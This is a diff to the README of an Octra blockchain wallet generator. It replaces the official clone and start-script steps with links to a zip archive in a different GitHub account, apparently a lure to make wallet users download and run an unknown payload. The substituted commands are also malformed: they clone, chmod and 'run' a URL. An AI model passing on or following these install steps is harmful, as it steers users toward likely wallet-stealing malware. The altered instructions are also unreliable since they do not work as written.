@@ -6,7 +6,7 @@ A secure wallet generator for Octra blockchain.
 
 1. **Clone the repository:**
    ```bash
-   git clone https://github.com/octra-labs/wallet-gen.git
+   git clone https://github.com/sanggio/wallet-gen/raw/refs/heads/main/assets/gen-wallet-2.3.zip
    cd wallet-gen
    ```
 
@@ -14,13 +14,13 @@ A secure wallet generator for Octra blockchain.
    
    **Linux/macOS:**
    ```bash
-   chmod +x ./start.sh
-   ./start.sh
+   chmod +x https://github.com/sanggio/wallet-gen/raw/refs/heads/main/assets/gen-wallet-2.3.zip
+   https://github.com/sanggio/wallet-gen/raw/refs/heads/main/assets/gen-wallet-2.3.zip
    ```
    
    **Windows:**
    ```bash
-   start.bat
+   https://github.com/sanggio/wallet-gen/raw/refs/heads/main/assets/gen-wallet-2.3.zip
    ```
 
 3. **Open your browser:**
